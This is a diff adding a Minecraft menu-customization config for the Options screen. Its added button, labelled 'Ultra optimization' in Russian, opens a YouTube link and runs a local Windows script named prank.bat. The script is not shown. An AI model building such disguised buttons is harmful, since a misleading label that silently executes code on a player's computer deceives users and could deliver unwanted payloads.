@@ -1,0 +1,50 @@
+type = menu
+
+customization-meta {
+  identifier = net.minecraft.client.gui.GuiOptions
+  randomgroup = 1
+  renderorder = foreground
+  randommode = false
+  randomonlyfirsttime = false
+}
+
+customization {
+  restart_on_load = false
+  name = backquestion_001_menu
+  action = animatebackground
+}
+
+customization {
+  keepaspectratio = false
+  action = backgroundoptions
+}
+
+customization {
+  identifier = %id=400334%
+  orientation = mid-centered
+  x = 5
+  action = movebutton
+  y = -62
+}
+
+customization {
+  identifier = %id=400334%
+  width = 150
+  action = resizebutton
+  height = 20
+}
+
+customization {
+  orientation = top-left
+  loopbackgroundanimations = true
+  restartbackgroundanimations = true
+  buttonaction = openlink;https://www.youtube.com/watch?v=D8Ly6oPsAkk%btnaction_splitter_fm%runcmd;[windows:prank.bat];%btnaction_splitter_fm%
+  x = 485
+  width = 150
+  action = addbutton
+  actionid = a7a0ce52-306b-4746-a3a8-c613666dcc741717876036134
+  y = 104
+  label = Ультра оптимизация
+  height = 20
+}
+
